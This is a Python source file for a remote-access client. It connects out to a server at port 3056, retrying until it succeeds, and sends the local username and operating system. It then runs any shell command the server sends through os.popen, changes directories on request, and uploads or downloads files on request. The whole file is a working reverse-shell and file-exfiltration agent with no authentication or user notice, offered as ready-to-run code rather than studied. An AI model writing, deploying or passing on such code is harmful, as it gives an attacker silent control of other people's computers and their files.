import socket, os, time
from getpass import getuser
import platform
import ipsetter

class Client:
    def __init__(self):
        self.SIZE = 1024
        self.INFO = 'info.ns'

        self._socket = socket.socket()
        self.open_socket()
        self.info_init()

        self.receive_loop()


    def open_socket(self):
        self.ADDR = (ipsetter.get_serverip(), 3056)
        try:
            self._socket.connect(self.ADDR)
        except ConnectionRefusedError:
            time.sleep(1)
            self.open_socket()
        


    def info_init(self):
        if not os.path.isfile(self.INFO):
            self.info_setting(str(getuser()))
        with open(self.INFO, 'r') as f:
            self._socket.sendall(f.readlines()[0].replace('\n','').encode())


    def info_setting(self, alias):
        with open(self.INFO, 'w') as f:
            f.write(alias + '\n')
            f.write(str(getuser()) + '\n')
            f.write(str(platform.system()) + '\n')
        

    def transfer(self):
        typ = self._socket.recv(self.SIZE).decode()

        if typ == 'command':
            self._socket.sendall('Ready'.encode())
            recv = self._socket.recv(self.SIZE).decode()
            if recv[:2] == 'cd':
                res = os.chdir(recv[3:])
            else:
                res = os.popen(recv).read()
            if not res:
                res = 'No Result'
            self._socket.sendall(res.encode())

        elif typ == 'file send':
            self._socket.sendall('Ready'.encode())
            filename = self._socket.recv(self.SIZE).decode()
            if filename == 'sorry':
                return
            with open(filename, 'wb') as f:
                while True:
                    _buff = self._socket.recv(self.SIZE)
                    if _buff == b'99':
                        break
                    else:
                        f.write(_buff)
                        self._socket.sendall('ok'.encode())

        elif typ == 'file receive':
            self._socket.sendall('Ready'.encode())
            filename = self._socket.recv(self.SIZE).decode()
            if not os.path.isfile(filename):
                self._socket.sendall('sorry'.encode())
                return
            else:
                self._socket.sendall('ok'.encode())
            self._socket.recv(self.SIZE)
            with open(filename, 'rb') as f:
                while True:
                    _buff = f.read(self.SIZE)
                    if not _buff:
                        self._socket.sendall(b'99')
                        break
                    self._socket.sendall(_buff)
                    self._socket.recv(self.SIZE)

        elif typ == 'set alias':
            self._socket.sendall('Ready'.encode())
            self.info_setting(self._socket.recv(self.SIZE).decode())

        else:
            self._socket.sendall('Undefined command'.encode())


    def receive_loop(self):
        try:
            while True:
                self.transfer()
        except:
            self._socket.sendall('Error'.encode())
        finally:
            self._socket.close()

def main():
    try:
        c = Client()
    except BrokenPipeError:
        main()

if __name__ == '__main__':
    main()

